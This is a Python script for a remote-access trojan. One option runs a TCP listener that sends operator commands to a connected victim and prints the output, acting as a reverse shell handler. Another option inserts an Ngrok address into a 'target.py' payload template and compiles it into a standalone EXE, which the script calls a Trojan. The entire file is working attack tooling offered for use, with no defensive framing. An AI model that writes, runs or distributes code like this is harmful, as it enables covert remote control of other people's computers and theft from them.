import socket, os
SOURCE = {
    'IP':'127.0.0.1',
    'PORT':9900,
    'LENGHT':5000
    }

def shell():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_api:
        socket_api.bind((SOURCE['IP'], SOURCE['PORT']))
        socket_api.listen(2)
        print('start server')
        client, addr = socket_api.accept()
        client.send(b'connected')
        print(addr)
        while True:
            command = input(">> ")
            if command == 'exit':
                break
            client.send(command.encode())
            result = client.recv(SOURCE['LENGHT']).decode()
            print(result)

def MakeRat(ip, port):
    code = open('target.py', 'r').read()
    code = code.replace('[IP]', ip)
    code = code.replace('[PORT]', port)
    open(f'{ip}.py', 'wb').write(code.encode())
    os.system(f'PyInstaller --onefile {ip}.py')
    print(f"Success Genrrate EXE TCP://{ip}:{port}")



while True:
    command = input("[1].Connect Shell\n[2].Make Trojan Shell\n")
    if command == '1':
        shell()
    else:
        ip, port = input("Enter IP FROM Ngrok : "), input("Enter Port FROM Ngrok : ")
        MakeRat(ip, port)
